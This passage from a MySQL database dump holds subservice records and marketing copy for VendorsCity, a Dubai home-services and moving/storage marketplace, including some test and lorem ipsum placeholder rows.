(40, '33', 'AC Servicing', 'ac-servicing', '<p>Regular servicing is the key to extending the lifespan of your AC units. Our thorough and meticulous servicing includes cleaning, filter replacement, and performance checks to keep your system in top-notch condition.</p>', NULL, '1708949777Screenshot-2024-02-26-at-4.16.06 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:40:08', '2024-02-26 06:46:17'),
(41, '33', 'AC Duct Cleaning', 'ac-duct-cleaning', '<p>Improve indoor air quality and energy efficiency with our professional AC duct cleaning services. We remove dust, allergens, and contaminants, ensuring a healthier environment for you and your family.</p>', NULL, '17089350937.jpg', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:41:33', '2024-02-26 02:46:00'),
(42, '33', 'AC System Upgrades', 'ac-system-upgrades', '<p>Enhance energy efficiency and performance with our AC system upgrade services. We assess your current setup and recommend cost-effective solutions to optimize your cooling experience.</p>', NULL, '1708949736Screenshot-2024-02-26-at-4.15.26 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:43:34', '2024-02-26 06:45:36'),
(43, '33', 'AC Inspection & Consultation', 'ac-inspection-consultation', '<p>Unsure about your AC needs? Our experienced technicians provide thorough inspections and consultations, offering personalized recommendations to meet your specific requirements.</p>', NULL, '1708949661Screenshot-2024-02-26-at-4.14.04 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:44:30', '2024-02-26 06:44:21'),
(44, '33', 'Smart AC Solutions', 'smart-ac-solutions', NULL, NULL, '1708949626Screenshot-2024-02-26-at-4.13.34 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 02:50:48', '2024-02-26 06:43:46'),
(45, '34', 'Plumbing Solutions', 'plumbing-solutions', NULL, NULL, '1708949579Screenshot-2024-02-26-at-4.12.38 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 03:03:57', '2024-02-26 06:42:59'),
(46, '34', 'Electrical Services', 'electrical-services', NULL, NULL, '1708949513Screenshot-2024-02-26-at-4.11.33 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 03:05:12', '2024-02-26 06:41:53'),
(47, '34', 'Painting Services', 'painting-services', NULL, NULL, '1708948415home-painting-service-dubai.jpg', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 06:23:35', '2024-02-26 06:23:35'),
(48, '34', 'Carpentry Work', 'carpentry-work', NULL, NULL, '1708949435Screenshot-2024-02-26-at-4.09.16 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 06:24:30', '2024-02-26 06:40:35'),
(49, '34', 'Bathroom & Kitchen Repairs', 'bathroom-kitchen-repairs', NULL, NULL, '1708949315Screenshot-2024-02-26-at-4.06.07 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 06:25:33', '2024-02-26 06:38:35'),
(50, '34', 'Furniture Assembly', 'furniture-assembly', NULL, NULL, '1708949105Screenshot-2024-02-26-at-4.04.51 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 06:27:42', '2024-02-26 06:35:05'),
(51, '34', 'TV Mounting', 'tv-mounting', NULL, NULL, '1708948954Screenshot-2024-02-26-at-4.01.33 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 06:32:35', '2024-02-26 06:32:35'),
(52, '34', 'Home Appliance Repair & Installation', 'home-appliance-repair-installation', NULL, NULL, '1708949055Screenshot-2024-02-26-at-4.04.00 PM.png', NULL, '1', '1', '1', '20', 0, NULL, NULL, '2024-02-26 06:34:15', '2024-02-26 06:34:15'),
(53, '30', 'Office Moving', 'office-moving', '<h4><strong>How it works</strong></h4><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><h4><strong>Specify your Service Requirements</strong></h4><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your moving needs.</p><h4><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></h4><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><h4><strong>Leave the rest to us</strong></h4><p>Once you’ve chosen a company, confirm the details of your move with them. Then, simply relax and unwind while our trusted vendor takes care of the job!</p><h4><strong>Movers in Dubai</strong></h4><p>It is easy to feel overwhelmed by the long list of tasks that need to be taken care of while moving in Dubai. From packing items to moving them to the right rooms in your new home and then unpacking everything, the process involves a lot of challenging steps. The easiest way to make the moving process hassle-free is to find and get in touch with the best Dubai movers and packers on ServiceMarket.</p>', '<p><strong>Moving in the UAE</strong></p><p>Booking your moving service has never been easier. Skip the daunting task of searching for numerous vendors – at VendorsCity, we simplify the process. Effortlessly obtain 5 free quotes from trusted and professional vendors catering to various needs. Alternatively, explore our diverse range of packages tailored to suit your requirements, be it an&nbsp;<strong>office move</strong>,&nbsp;<strong>apartment move</strong>, or&nbsp;<strong>villa move</strong>. Our carefully selected vendors boast trustworthiness and professionalism. Choose ease and reliability with us as you embark on your moving adventure in the UAE.</p>', '1716789283Office-Moving.jpg', '1717070219Office-Moving-min.jpg', '1', '1', '1', '15', 4, '17', '57', '2024-02-29 03:00:35', '2024-03-03 01:25:06'),
(59, '41', 'Test AC', 'test-ac', NULL, NULL, '17103904611699017358download.jpg', '171586427916990170862.jpg', '15000', '10', '1', '10', 0, '17', '18', NULL, NULL),
(61, '44', 'Self Storage', 'self-storage', '<p><strong>How it works</strong></p><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><p><strong>Specify your Service Requirements</strong></p><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your storage needs.</p><p><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></p><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><p><strong>Leave the rest to us</strong></p><p>Once you’ve chosen a company, confirm the details of your storage with them. Then, simply relax and unwind while our trusted vendor takes care of the job!<br><br><strong>Storage in Dubai</strong></p><p>Handling the myriad tasks associated with relocating belongings into storage within Dubai can be a complex process. From the careful packing of items to organizing them in your chosen storage space and, eventually, the retrieval process – each step presents its own set of challenges. Make your storage experience seamless by effortlessly connecting with top-tier storage service providers through VendorsCity. Simplify the process and ensure a hassle-free transition into storage with the guidance of reliable professionals.</p>', '<p><strong>Storing your Goods in Dubai –</strong></p><p>Securing storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage. Our handpicked vendors are renowned for their reliability and professionalism. Opt for convenience and trustworthiness with us as you embark on your storage journey in Dubai.</p>', '1716790680Self-Storage.jpg', '1717073297Storage-Sub-Category-min.jpg', '150', '10', '1', '10', 0, NULL, NULL, NULL, NULL),
(62, '44', 'Ac Storage', 'ac-storage', '<p><strong>How it works</strong></p><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><p><strong>Specify your Service Requirements</strong></p><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your storage needs.</p><p><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></p><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><p><strong>Leave the rest to us</strong></p><p>Once you’ve chosen a company, confirm the details of your storage with them. Then, simply relax and unwind while our trusted vendor takes care of the job!<br><br><strong>Storage in Dubai</strong></p><p>Handling the myriad tasks associated with relocating belongings into storage within Dubai can be a complex process. From the careful packing of items to organizing them in your chosen storage space and, eventually, the retrieval process – each step presents its own set of challenges. Make your storage experience seamless by effortlessly connecting with top-tier storage service providers through VendorsCity. Simplify the process and ensure a hassle-free transition into storage with the guidance of reliable professionals.</p>', '<p><strong>Storing your Goods in Dubai –</strong></p><p>Securing storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage. Our handpicked vendors are renowned for their reliability and professionalism. Opt for convenience and trustworthiness with us as you embark on your storage journey in Dubai.</p>', '1716790665AC-Storage.jpg', '1717073265Storage-Sub-Category-min.jpg', '150', '10', '1', '10', 0, NULL, NULL, NULL, NULL),
(63, '44', 'Commercial Storage', 'commercial-storage', '<p><strong>How it works</strong></p><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><p><strong>Specify your Service Requirements</strong></p><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your storage needs.</p><p><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></p><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><p><strong>Leave the rest to us</strong></p><p>Once you’ve chosen a company, confirm the details of your storage with them. Then, simply relax and unwind while our trusted vendor takes care of the job!<br><br><strong>Storage in Dubai</strong></p><p>Handling the myriad tasks associated with relocating belongings into storage within Dubai can be a complex process. From the careful packing of items to organizing them in your chosen storage space and, eventually, the retrieval process – each step presents its own set of challenges. Make your storage experience seamless by effortlessly connecting with top-tier storage service providers through VendorsCity. Simplify the process and ensure a hassle-free transition into storage with the guidance of reliable professionals.</p>', '<p><strong>Storing your Goods in Dubai –</strong></p><p>Securing storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage. Our handpicked vendors are renowned for their reliability and professionalism. Opt for convenience and trustworthiness with us as you embark on your storage journey in Dubai.</p>', '1716790652Commercial-Storage.jpg', '1717073231Storage-Sub-Category-min.jpg', '120', '10', '1', '10', 0, NULL, NULL, NULL, NULL),
(64, '44', 'Non/Ac Storage', 'non-ac-storage', '<p><strong>How it works</strong></p><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><p><strong>Specify your Service Requirements</strong></p><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your storage needs.</p><p><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></p><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><p><strong>Leave the rest to us</strong></p><p>Once you’ve chosen a company, confirm the details of your storage with them. Then, simply relax and unwind while our trusted vendor takes care of the job!<br><br><strong>Storage in Dubai</strong></p><p>Handling the myriad tasks associated with relocating belongings into storage within Dubai can be a complex process. From the careful packing of items to organizing them in your chosen storage space and, eventually, the retrieval process – each step presents its own set of challenges. Make your storage experience seamless by effortlessly connecting with top-tier storage service providers through VendorsCity. Simplify the process and ensure a hassle-free transition into storage with the guidance of reliable professionals.</p>', '<p><strong>Storing your Goods in Dubai –</strong></p><p>Securing storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage. Our handpicked vendors are renowned for their reliability and professionalism. Opt for convenience and trustworthiness with us as you embark on your storage journey in Dubai.</p>', '1716790638Non-AC-Storage.jpg', '1717073211Storage-Sub-Category-min.jpg', '120', '10', '1', '10', 0, NULL, NULL, NULL, NULL),
(65, '44', 'Furniture Storage', 'furniture-storage', '<p><strong>How it works</strong></p><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><p><strong>Specify your Service Requirements</strong></p><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your storage needs.</p><p><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></p><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><p><strong>Leave the rest to us</strong></p><p>Once you’ve chosen a company, confirm the details of your storage with them. Then, simply relax and unwind while our trusted vendor takes care of the job!<br><br><strong>Storage in Dubai</strong></p><p>Handling the myriad tasks associated with relocating belongings into storage within Dubai can be a complex process. From the careful packing of items to organizing them in your chosen storage space and, eventually, the retrieval process – each step presents its own set of challenges. Make your storage experience seamless by effortlessly connecting with top-tier storage service providers through VendorsCity. Simplify the process and ensure a hassle-free transition into storage with the guidance of reliable professionals.</p>', '<p><strong>Storing your Goods in Dubai –</strong></p><p>Securing storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage. Our handpicked vendors are renowned for their reliability and professionalism. Opt for convenience and trustworthiness with us as you embark on your storage journey in Dubai.</p>', '1716790615Furniture-Storage.jpg', '1717073178Storage-Sub-Category-min.jpg', '150', '10', '1', '10', 0, NULL, NULL, NULL, NULL),
(66, '44', 'Vehicles Storage', 'vehicles-storage', '<p><strong>How it works</strong></p><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><p><strong>Specify your Service Requirements</strong></p><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your storage needs.</p><p><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></p><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><p><strong>Leave the rest to us</strong></p><p>Once you’ve chosen a company, confirm the details of your storage with them. Then, simply relax and unwind while our trusted vendor takes care of the job!<br><br><strong>Storage in Dubai</strong></p><p>Handling the myriad tasks associated with relocating belongings into storage within Dubai can be a complex process. From the careful packing of items to organizing them in your chosen storage space and, eventually, the retrieval process – each step presents its own set of challenges. Make your storage experience seamless by effortlessly connecting with top-tier storage service providers through VendorsCity. Simplify the process and ensure a hassle-free transition into storage with the guidance of reliable professionals.</p>', '<p><strong>Storing your Goods in Dubai –</strong></p><p>Securing storage solutions for your goods has never been simpler. Bypass the challenging task of scouring through numerous vendors – at VendorsCity, we streamline the process. Easily receive 5 free quotes from reputable vendors specializing in various storage needs, whether it\'s personal storage, commercial storage, or self-storage. Our handpicked vendors are renowned for their reliability and professionalism. Opt for convenience and trustworthiness with us as you embark on your storage journey in Dubai.</p>', '1716790586Vehicle-Storage.jpg', '1717073129Storage-Sub-Category-min.jpg', '100', '10', '1', '10', 0, NULL, NULL, NULL, NULL),
(69, '30', 'Furniture Moving', 'furniture-moving', '<h4><strong>How it works</strong></h4><p>Our process is straightforward – we\'ve collaborated with the top-notch companies in Dubai to ensure you receive the service you truly deserve.</p><h4><strong>Specify your Service Requirements</strong></h4><p>We’ll connect you with the finest&nbsp;<strong>Vendors</strong> in Dubai. Obtain five complimentary quotes and choose the perfect vendor for your moving needs.</p><h4><strong>Receive Quotes from Reputable &amp; Skilled Vendors</strong></h4><p>Evaluate rates, reviews and credentials to make an informed decision before confirming your move.</p><h4><strong>Leave the rest to us</strong></h4><p>Once you’ve chosen a company, confirm the details of your move with them. Then, simply relax and unwind while our trusted vendor takes care of the job!</p><h4><strong>Movers in Dubai</strong></h4><p>It is easy to feel overwhelmed by the long list of tasks that need to be taken care of while moving in Dubai. From packing items to moving them to the right rooms in your new home and then unpacking everything, the process involves a lot of challenging steps. The easiest way to make the moving process hassle-free is to find and get in touch with the best Dubai movers and packers on ServiceMarket.</p>', '<p><strong>Moving in the UAE</strong></p><p>Booking your moving service has never been easier. Skip the daunting task of searching for numerous vendors – at VendorsCity, we simplify the process. Effortlessly obtain 5 free quotes from trusted and professional vendors catering to various needs. Alternatively, explore our diverse range of packages tailored to suit your requirements, be it an&nbsp;<strong>office move</strong>,&nbsp;<strong>apartment move</strong>, or&nbsp;<strong>villa move</strong>. Our carefully selected vendors boast trustworthiness and professionalism. Choose ease and reliability with us as you embark on your moving adventure in the UAE.</p>', '1716789106Furniture-Moving.jpg', '1717070129Furniture-Moving-min.jpg', '400', '40', '1', '10', 6, '17', '57', NULL, NULL),
(71, '46', 'Iphone Repairing', 'iphone-repairing', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie.</p>', '<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed eu nulla velit. Morbi lorem lorem, volutpat quis turpis a, pulvinar feugiat dui. Vivamus elementum eu orci ut molestie.</p>', '17170046561_F7sTt3Ee5gEdLyyhHdZZRg.jpg', '1717004656phone-repair.jpg', '1', '10', '1', NULL, 0, NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `subservice_attr`
--

CREATE TABLE `subservice_attr` (
  `id` int(11) NOT NULL,
  `title_addmore` varchar(255) DEFAULT NULL,
  `image` varchar(255) DEFAULT NULL,
  `description_addmore` text,
  `pid` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `subservice_attr`
--

INSERT INTO `subservice_attr` (`id`, `title_addmore`, `image`, `description_addmore`, `pid`) VALUES
(1, 'testagd', '1709822397-download-(3).jfif', 'testadgag', 55),
(2, 'adgasga', '1709822397-download.jfif', 'dagagd', 55),
(3, 'How VendorsCity can make a difference', '1716959984-How_VC_can_make_a_difference-min.jpg', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 23),
(4, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '1716959984-Moving_-in_Dubai_promises_a_dynamic-min.jpg', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 23),
(7, 'test-u', '1709899057-download2.jpg', '<p>test-u</p>', 57),
(8, 'test-1-u', '1709898990-download-(4).png', '<p>test-1-u</p>', 57),
(9, 'test-2', '1709899040-16990170862.jpg', '<p>test-2</p>', 57),
(10, 'test-u', '1709901571-download-(1).jpg', '<p>test-u</p>', 58),
(11, 'How VendorsCity can make a difference', '', '<p>VendorsCity provides an efficient method for discovering the perfect storage solution in Dubai. Obtain up to 5 complimentary quotes from accredited local storage service providers, giving you the knowledge to make well-informed decisions. By comparing prices and reviews, you can confidently choose the storage company that aligns best with your requirements. This considerate process ensures a stress-free storage experience tailored to your preferences. Operating within an extensive network of Dubai storage providers, VendorsCity meticulously evaluates them for quality and reliability. While we aim for excellence, it\'s important to recognize that no company can guarantee a flawless storage solution. We encourage customers to conduct their own research, read reviews, and select a storage partner with confidence.</p>', 61),
(12, 'Items which are prohibited to store', '', '<p>Storage units in Dubai have restrictions on certain items, guided by security, safety, and regulatory considerations. These prohibited items include valuables, perishable foods, toxic or hazardous materials, animals, plants, unregistered vehicles, and machinery with full fuel tanks. To ensure adherence to regulations and make informed decisions about your storage, it\'s crucial to engage with the storage facility manager. By understanding specific limitations and guidelines for your chosen storage unit, you contribute to a secure and well-managed storage experience in Dubai, aligning with regulatory standards and ensuring the safety of both your belongings and the storage facility.</p>', 61),
(13, 'Self Storage vs Shared Storage', '', '<p>When deciding between self-storage and shared storage solutions, it boils down to your specific needs and preferences. Opting for self-storage offers exclusive control, privacy, and easy accessibility to your stored items. On the other hand, shared storage is a cost-effective option with a sense of community and managed facilities. Consider the nature of your items, budget constraints, and how often you\'ll need access to make the choice that aligns best with your requirements. Whether you prioritize individual control or cost-effectiveness, both options cater to distinct preferences in storage solutions.</p>', 61),
(14, 'AC Storage vs NON-AC Storage', '', '<p>Deciding between AC and non-AC storage hinges on the nature of your stored items and your budget. AC storage offers controlled temperature and humidity, making it suitable for delicate items like antiques and electronics but tends to be more expensive. Non-AC storage, being cost-effective, is suitable for items that can withstand varying temperatures, such as outdoor furniture or tools. Consider the specific preservation needs of your belongings and your budget constraints to make the optimal choice for your storage solution.</p>', 61),
(15, 'Choosing the right Storage Vendor', '', '<p>When selecting a storage vendor, key considerations can significantly impact the safety and convenience of your stored belongings. Prioritize security features, ensuring surveillance and access controls are robust. Check for climate control options, especially for sensitive items. Evaluate storage unit sizes, accessibility, and inquire about insurance coverage. Customer reviews offer insights into the vendor\'s reputation. Opt for a conveniently located facility, keeping transportation in mind. Assess cleanliness, maintenance, and contract terms, favoring flexibility. If you have specific needs, check for specialized services. By attentively weighing these factors, you can make an informed decision and ensure a secure and tailored storage solution.</p>', 61),
(16, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 26),
(17, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 26),
(18, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 53),
(19, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 53),
(20, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 67),
(21, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 67),
(22, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 32),
(23, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 32),
(24, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 69),
(25, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 69),
(26, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 27),
(27, 'Moving in Dubai promises a dynamic and well-organized experience. Here\'s what to anticipate:', '', '<p>Experience a seamless moving process in Dubai with professional movers. They kick off with a comprehensive survey of your belongings to finalize rates and understand your specific requirements. On the moving day, a skilled team ensures the expert disassembly and secure packing of your items, ready for transportation in a dedicated moving truck. Your belongings are efficiently transported to your new home, with the team handling all logistics. Upon arrival, they offer the convenience of unpacking and reassembly, unless you prefer a hands-on approach. The duration of your move varies based on factors like home size, distance, and complexity, ensuring a tailored and efficient relocation experience.</p>', 27),
(28, 'How VendorsCity can make a difference', '', '<p>VendorsCity offers a streamlined approach to finding the ideal moving partner in Dubai. Receive up to 5 complimentary quotes from licensed local movers, empowering you to make informed decisions. By comparing prices and reviews, you can select the moving company that best aligns with your needs. This thoughtful process ensures a stress-free moving experience tailored to your preferences. Operating within a vast network of Dubai movers and packers, VendorsCity diligently screens them for quality and reliability. While we strive for excellence, it\'s essential to acknowledge that no company can guarantee a flawless move. We encourage customers to conduct their own research, read reviews, and choose a moving partner with confidence.</p>', 31),
(29, 'How VendorsCity can make a difference', '', '<p>VendorsCity provides an efficient method for discovering the perfect storage solution in Dubai. Obtain up to 5 complimentary quotes from accredited local storage service providers, giving you the knowledge to make well-informed decisions. By comparing prices and reviews, you can confidently choose the storage company that aligns best with your requirements. This considerate process ensures a stress-free storage experience tailored to your preferences. Operating within an extensive network of Dubai storage providers, VendorsCity meticulously evaluates them for quality and reliability. While we aim for excellence, it\'s important to recognize that no company can guarantee a flawless storage solution. We encourage customers to conduct their own research, read reviews, and select a storage partner with confidence.</p>', 62),
(30, 'Items which are prohibited to store', '', '<p>Storage units in Dubai have restrictions on certain items, guided by security, safety, and regulatory considerations. These prohibited items include valuables, perishable foods, toxic or hazardous materials, animals, plants, unregistered vehicles, and machinery with full fuel tanks. To ensure adherence to regulations and make informed decisions about your storage, it\'s crucial to engage with the storage facility manager. By understanding specific limitations and guidelines for your chosen storage unit, you contribute to a secure and well-managed storage experience in Dubai, aligning with regulatory standards and ensuring the safety of both your belongings and the storage facility.</p>', 62),
